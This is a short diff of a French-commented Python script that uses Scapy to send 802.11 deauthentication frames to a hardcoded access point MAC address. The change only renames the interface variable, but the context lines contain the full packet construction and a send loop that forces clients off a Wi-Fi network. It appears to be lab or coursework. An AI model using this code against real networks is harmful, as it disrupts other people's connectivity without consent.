@@ -10,9 +10,8 @@ ap_mac = "C8:21:58:91:55:2D"
 # ap_mac = input("Indiquez l'adresse MAC du point d'accès: ")
 
 # Interface réseau
-interface="wlan0"
+ifname = "wlan0"
 # interface = input("Indiquez le nom de l'interface: ")
-
 
 print("- Veuillez choisir la raison -")
 print("1 - Unspecified")
@@ -37,4 +36,4 @@ else:
 pkt = RadioTap() / Dot11(addr1=dest, addr2=src, addr3=ap_mac) / Dot11Deauth(reason=reason_code)
 
 # Envoyer la trame
-sendp(pkt, iface=interface, count=10, inter=0.1)
+sendp(pkt, iface=ifname, count=10, inter=0.1)
